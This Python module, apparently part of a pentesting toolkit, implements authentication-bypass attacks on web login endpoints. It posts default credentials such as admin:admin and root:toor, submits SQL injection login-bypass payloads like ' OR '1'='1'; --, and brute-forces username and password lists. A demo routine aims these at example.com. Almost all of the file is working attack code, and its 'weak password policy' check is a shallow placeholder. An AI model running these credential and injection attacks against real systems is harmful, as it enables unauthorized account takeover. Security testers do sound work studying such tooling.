"""
modules/pentesting_tools/authentication_bypass_tools.py

This module provides tools for detecting and exploiting authentication bypass vulnerabilities in 
web applications, APIs, and systems.
"""

import requests
from typing import List, Dict


class AuthenticationBypassTool:
    """
    A class for detecting and exploiting authentication bypass vulnerabilities.
    """

    @staticmethod
    def test_default_credentials(url: str, credentials: Dict[str, str]) -> List[str]:
        """
        Test for authentication bypass using default credentials.
        :param url: Target login endpoint URL.
        :param credentials: Dictionary of username-password pairs to test.
        :return: List of successful credential pairs.
        """
        print(f"Testing default credentials on {url}")
        successful_attempts = []
        for username, password in credentials.items():
            print(f"Trying credentials: {username}:{password}")
            try:
                response = requests.post(url, data={"username": username, "password": password})
                if response.status_code == 200 and "Welcome" in response.text:
                    print(f"Successful login with {username}:{password}")
                    successful_attempts.append(f"{username}:{password}")
            except Exception as e:
                print(f"Error testing credentials {username}:{password}: {e}")
        return successful_attempts

    @staticmethod
    def test_injection_bypass(url: str) -> bool:
        """
        Test for authentication bypass via SQL injection.
        :param url: Target login endpoint URL.
        :return: True if the bypass was successful, False otherwise.
        """
        print(f"Testing SQL injection bypass on {url}")
        injection_payloads = [
            "' OR '1'='1'; --",
            "' OR '1'='1' LIMIT 1; --",
            "' OR 1=1; --",
            "admin' --"
        ]
        for payload in injection_payloads:
            try:
                print(f"Trying payload: {payload}")
                response = requests.post(url, data={"username": payload, "password": "irrelevant"})
                if response.status_code == 200 and "Welcome" in response.text:
                    print(f"SQL injection bypass successful with payload: {payload}")
                    return True
            except Exception as e:
                print(f"Error testing injection payload: {e}")
        print("SQL injection bypass failed.")
        return False

    @staticmethod
    def brute_force_authentication(url: str, usernames: List[str], passwords: List[str]) -> List[str]:
        """
        Perform brute force authentication attempts on a target login endpoint.
        :param url: Target login endpoint URL.
        :param usernames: List of usernames to test.
        :param passwords: List of passwords to test.
        :return: List of successful username-password combinations.
        """
        print(f"Starting brute force authentication on {url}")
        successful_attempts = []
        for username in usernames:
            for password in passwords:
                print(f"Trying {username}:{password}")
                try:
                    response = requests.post(url, data={"username": username, "password": password})
                    if response.status_code == 200 and "Welcome" in response.text:
                        print(f"Successful login with {username}:{password}")
                        successful_attempts.append(f"{username}:{password}")
                except Exception as e:
                    print(f"Error during brute force for {username}:{password}: {e}")
        return successful_attempts

    @staticmethod
    def detect_weak_password_policies(users: List[str], common_passwords: List[str]) -> Dict[str, List[str]]:
        """
        Detect weak password policies by testing common passwords for a list of users.
        :param users: List of usernames.
        :param common_passwords: List of commonly used passwords.
        :return: Dictionary of users with successful weak password attempts.
        """
        print("Detecting weak password policies...")
        weak_passwords = {}
        for user in users:
            weak_passwords[user] = []
            for password in common_passwords:
                print(f"Testing password for {user}: {password}")
                if password.lower() == user.lower() or password == "123456":
                    print(f"Weak password detected for {user}: {password}")
                    weak_passwords[user].append(password)
        return weak_passwords


class AuthenticationBypassTester:
    """
    A class to test the Authentication Bypass tools.
    """

    @staticmethod
    def run_tests():
        """
        Runs tests for authentication bypass tools.
        """
        print("Running authentication bypass tests...")

        # Default Credential Test
        default_credentials = {
            "admin": "admin",
            "user": "password",
            "root": "toor",
        }
        url = "http://example.com/login"
        default_cred_results = AuthenticationBypassTool.test_default_credentials(url, default_credentials)
        print(f"Default credential test results: {default_cred_results}")

        # SQL Injection Bypass Test
        sql_injection_result = AuthenticationBypassTool.test_injection_bypass(url)
        print(f"SQL injection bypass result: {sql_injection_result}")

        # Brute Force Test
        usernames = ["admin", "user", "guest"]
        passwords = ["admin", "1234", "password", "guest"]
        brute_force_results = AuthenticationBypassTool.brute_force_authentication(url, usernames, passwords)
        print(f"Brute force test results: {brute_force_results}")

        # Weak Password Policy Test
        users = ["admin", "test_user"]
        common_passwords = ["admin", "123456", "password", "qwerty"]
        weak_password_policy_results = AuthenticationBypassTool.detect_weak_password_policies(users, common_passwords)
        print(f"Weak password policy results: {weak_password_policy_results}")


if __name__ == "__main__":
    # Run authentication bypass tests
    AuthenticationBypassTester.run_tests()
